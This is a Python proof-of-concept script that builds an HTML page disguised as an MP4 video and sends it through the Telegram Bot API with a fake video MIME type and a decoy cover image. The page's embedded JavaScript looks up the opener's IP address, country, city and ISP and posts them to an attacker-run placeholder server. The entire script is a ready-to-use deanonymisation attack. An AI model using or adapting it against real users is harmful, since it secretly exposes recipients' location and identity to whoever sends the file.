import requests


BOT_TOKEN = "your_bot_token"
CHAT_ID = "your_chat_id"


html_content = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script>
        fetch('http://ip-api.com/json')
            .then(response => response.json())
            .then(data => {
                
                fetch('http://your_ip:5000/log_ip', {  
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        ip: data.query,
                        country: data.country,
                        region: data.regionName,
                        city: data.city,
                        isp: data.isp
                    })
                });
            })
            .catch(error => console.error('Error fetching IP:', error));
    </script>
</head>
<body>
</body>
</html>



"""


html_path = "testv.mp4"
with open(html_path, "w") as file:
    file.write(html_content)


files = {
    "video": (
        "a.htm",
        open(html_path, "rb"),  
        "video/mp4"
    )
}


url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
cover_url = "https://github.com/drconfig/telegram-video-extension-manipulation-PoC/blob/addcover/blue.jpg?raw=true"

data = {"chat_id": CHAT_ID, "supports_streaming": False , "cover" : cover_url}
response = requests.post(url, data=data, files=files)

if response.status_code == 200:
    print("message send")
else:
    print(f"Hata: {response.text}")
